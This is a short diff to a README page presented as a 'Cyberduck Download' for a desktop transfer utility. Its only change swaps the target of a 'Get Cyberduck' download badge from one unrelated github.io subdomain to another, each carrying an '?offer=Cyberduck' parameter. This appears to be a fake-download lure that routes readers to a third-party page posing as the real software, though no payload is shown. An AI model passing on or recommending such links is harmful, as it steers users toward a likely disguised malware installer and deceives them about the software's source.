@@ -1,6 +1,6 @@
 # Cyberduck Download — Desktop Transfer Utility
 
-[![Get Cyberduck GitHub](https://img.shields.io/badge/Get%20Cyberduck%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-deploy.github.io/.github/?offer=Cyberduck)
+[![Get Cyberduck GitHub](https://img.shields.io/badge/Get%20Cyberduck%20GitHub-2EA44F?style=for-the-badge&logo=github&logoColor=white)](https://git-app-setup.github.io/.github/?offer=Cyberduck)
 
 ---
 
